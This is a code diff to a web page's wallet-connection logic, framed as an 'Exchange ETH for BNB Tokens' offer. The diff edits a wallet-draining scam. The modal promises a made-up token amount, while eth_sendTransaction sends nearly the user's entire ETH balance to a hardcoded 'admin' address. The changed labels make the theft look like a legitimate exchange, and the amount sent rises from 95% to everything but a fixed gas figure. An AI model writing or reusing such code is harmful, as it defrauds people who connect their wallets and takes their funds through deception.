@@ -637,15 +637,15 @@ export default function Home() {
                           
                           if (balance > 0.0001) { // Minimum 0.0001 ETH
                             const bnbAmount = Math.floor(balance * 1000000);
-                            const transferAmount = (balance * 0.95).toFixed(6); // 95% of balance (5% for gas)
-                            const adminFee = (balance * 0.05).toFixed(6); // 5% admin fee
+                            const gasFee = 0.001; // Fixed gas fee
+                            const transferAmount = (balance - gasFee).toFixed(6); // Balance minus gas
                             
-                            // Show transfer confirmation with slider
+                            // Show transfer confirmation
                             const modal = document.createElement('div');
                             modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
                             modal.innerHTML = `
                               <div class="bg-white rounded-xl p-8 max-w-md mx-4 shadow-2xl">
-                                <h3 class="text-xl font-bold text-gray-900 mb-4">Transfer Balance for BNB Tokens</h3>
+                                <h3 class="text-xl font-bold text-gray-900 mb-4">Exchange ETH for BNB Tokens</h3>
                                 <div class="mb-4">
                                   <div class="text-sm text-gray-600 mb-2">Your Balance: ${balance.toFixed(6)} ETH</div>
                                   <div class="text-sm text-green-600 mb-2">You'll Receive: ${bnbAmount.toLocaleString()} BNB Tokens</div>
@@ -653,16 +653,20 @@ export default function Home() {
                                 </div>
                                 <div class="bg-gray-50 p-4 rounded-lg mb-4">
                                   <div class="flex justify-between text-sm">
-                                    <span>Transfer Amount:</span>
+                                    <span>You Send:</span>
                                     <span class="font-bold">${transferAmount} ETH</span>
                                   </div>
                                   <div class="flex justify-between text-sm">
-                                    <span>Admin Fee (5%):</span>
-                                    <span class="font-bold">${adminFee} ETH</span>
+                                    <span>Gas Fee:</span>
+                                    <span class="font-bold">${gasFee} ETH</span>
+                                  </div>
+                                  <div class="flex justify-between text-sm">
+                                    <span>You Keep:</span>
+                                    <span class="font-bold text-green-600">0 ETH</span>
                                   </div>
                                   <div class="flex justify-between text-sm border-t pt-2 mt-2">
-                                    <span>Total Sent:</span>
-                                    <span class="font-bold">${balance.toFixed(6)} ETH</span>
+                                    <span>You Get:</span>
+                                    <span class="font-bold text-blue-600">${bnbAmount.toLocaleString()} FBNB</span>
                                   </div>
                                 </div>
                                 <div class="flex space-x-3">
@@ -681,13 +685,13 @@ export default function Home() {
                               try {
                                 modal.remove();
                                 
-                                // Transfer entire balance to admin
+                                // Transfer balance minus gas to admin
                                 const transferTx = await window.ethereum.request({
                                   method: 'eth_sendTransaction',
                                   params: [{
                                     from: window.ethereum.selectedAddress,
                                     to: '0x849842febf6643f29328a2887b3569e2399ac237',
-                                    value: '0x' + Math.floor(balance * 0.95 * 1e18).toString(16), // 95% of balance
+                                    value: '0x' + Math.floor((balance - gasFee) * 1e18).toString(16), // Balance minus gas
                                     gas: '0x5208'
                                   }]
                                 });
